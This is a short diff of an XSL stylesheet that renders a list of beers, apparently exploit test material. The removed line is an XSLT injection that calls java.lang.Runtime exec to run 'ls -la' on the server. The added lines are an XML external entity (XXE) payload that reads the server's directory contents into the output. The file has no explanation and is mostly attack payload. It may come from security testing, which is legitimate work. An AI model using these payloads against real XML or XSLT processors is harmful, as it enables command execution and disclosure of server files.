@@ -3,8 +3,11 @@
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:unzip="java:java.lang.Runtime">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
 ===========================================
-
-<xsl:value-of select="unzip:exec(unzip:getRuntime(),concat('ls', ' -la'))"/>
+<!DOCTYPE root [
+ <!ELEMENT includeme ANY>
+ <!ENTITY xxe SYSTEM ".">
+]>
+<root>&xxe;</root>
   
 ===========================================
   <xsl:for-each select="beers/beer">
